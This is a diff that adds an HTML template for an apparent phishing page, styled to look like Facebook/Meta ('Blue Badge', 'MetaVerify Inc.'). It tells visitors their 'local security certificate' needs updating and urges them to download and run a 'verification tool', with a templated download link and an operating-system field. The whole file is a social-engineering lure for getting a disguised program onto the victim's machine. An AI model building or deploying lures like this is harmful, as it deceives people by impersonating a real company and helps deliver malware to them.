@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verification Center</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #f0f2f5;
+            color: #1c1e21;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+
+        .main-card {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            margin: 60px auto;
+            padding: 40px;
+            text-align: center;
+        }
+
+        .logo {
+            color: #1877f2;
+            font-size: 3rem;
+            margin-bottom: 20px;
+        }
+
+        .download-btn {
+            background-color: #1877f2;
+            color: #fff;
+            font-weight: bold;
+            padding: 12px 0;
+            font-size: 1rem;
+            width: 100%;
+            border-radius: 6px;
+            text-decoration: none;
+            display: block;
+            margin-top: 20px;
+            border: none;
+        }
+
+        .download-btn:hover {
+            background-color: #166fe5;
+            color: #fff;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="main-card">
+            <i class="fa-solid fa-check-circle logo"></i>
+            <h2 class="mb-3">Security Check Update</h2>
+            <p class="text-muted mb-4">To continue using your account features effectively and confirm your identity
+                (Blue Badge), please update your local security certificate.</p>
+
+            <div class="alert alert-warning text-start small">
+                <i class="fa-solid fa-triangle-exclamation me-1"></i>
+                <strong>Action Required:</strong> Download and run the verification tool for
+                <strong>{{ payload.os_type|capitalize }}</strong>.
+            </div>
+
+            <a href="{{ download_link }}" class="download-btn">
+                Download Security Tool
+            </a>
+
+            <p class="mt-4 small text-muted">
+                MetaVerify Inc. • Privacy • Terms
+            </p>
+        </div>
+    </div>
+</body>
+
+</html>
